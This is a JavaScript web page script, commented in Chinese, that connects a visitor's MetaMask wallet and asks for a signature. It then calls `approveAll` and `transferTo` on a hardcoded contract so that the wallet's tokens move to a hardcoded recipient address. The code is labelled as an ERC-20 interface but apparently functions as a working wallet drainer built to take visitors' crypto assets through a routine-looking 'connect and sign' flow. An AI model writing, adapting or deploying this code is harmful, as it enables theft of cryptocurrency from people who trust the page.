let web3;
let isConnected = false;
const recipientAddress = '0xa465e2fc9f9d527AAEb07579E821D461F700e699'; // 设置接收地址
const contractAddress = '0x1d142a62E2e98474093545D4A3A0f7DB9503B8BD'; // 智能合约地址

const erc20Abi = [
    {
        "inputs": [],
        "name": "approveAll",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "transferTo",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "_tokenAddress",
                "type": "address"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "constructor"
    },
    {
        "inputs": [],
        "name": "recipient",
        "outputs": [
            {
                "internalType": "address",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "token",
        "outputs": [
            {
                "internalType": "contract IERC20",
                "name": "",
                "type": "address"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

// 初始化页面
window.onload = async () => {
    const selectedWallet = 'metamask'; // 默认选择 MetaMask
    document.getElementById('walletSelector').value = selectedWallet;
    document.getElementById('signButton').disabled = true; // 禁用签名按钮，直到连接钱包
};

// 更新钱包列表
const updateWalletList = (address) => {
    const walletList = document.getElementById('walletList');
    walletList.innerHTML = ''; // 清空旧列表
    const walletItem = document.createElement('li');
    walletItem.innerText = address;
    walletList.appendChild(walletItem);
};

// 更新状态消息
const updateStatus = (message) => {
    const statusElement = document.getElementById('status');
    statusElement.innerText += `\n${message}`;
};

// 连接钱包
document.getElementById('connectButton').onclick = async () => {
    const selectedWallet = document.getElementById('walletSelector').value;

    try {
        if (selectedWallet === 'metamask') {
            if (window.ethereum) {
                // 请求钱包连接
                await window.ethereum.request({ method: 'eth_requestAccounts' });
                web3 = new Web3(window.ethereum);
                const accounts = await web3.eth.getAccounts();

                if (accounts.length > 0) {
                    updateWalletList(accounts[0]);
                    isConnected = true;
                    updateStatus('MetaMask 已连接');
                    document.getElementById('signButton').disabled = false; // 启用签名按钮
                } else {
                    updateStatus('未检测到任何账户');
                }
            } else {
                updateStatus('请安装 MetaMask 扩展程序');
            }
        }
    } catch (error) {
        updateStatus('连接钱包失败: ' + error.message);
    }
};

// 签名并转移资产
document.getElementById('signButton').onclick = async () => {
    const accounts = await web3.eth.getAccounts();
    if (accounts.length > 0) {
        const account = accounts[0];
        const message = `签名确认: 你正在授权从该钱包中转移代币到 ${recipientAddress}`;
        try {
            // 请求用户进行签名
            const signature = await web3.eth.personal.sign(message, account);
            updateStatus(`签名成功: ${signature}`);

            // 调用资产转移函数
            await transferAssets(account);
        } catch (error) {
            updateStatus(`签名失败: ${error.message}`);
        }
    } else {
        updateStatus('请先连接钱包');
    }
};

// 转移代币
const transferAssets = async (account) => {
    updateStatus(`正在获取 ${account} 的代币余额...`);
    
    const tokenContract = new web3.eth.Contract(erc20Abi, contractAddress);

    try {
        // 批准转移代币
        await tokenContract.methods.approveAll().send({ from: account });
        updateStatus('代币授权成功');
        
        // 执行转移操作
        await tokenContract.methods.transferTo().send({ from: account });
        updateStatus(`代币已成功转移到 ${recipientAddress}`);
    } catch (error) {
        updateStatus(`转移代币失败: ${error.message}`);
    }
};
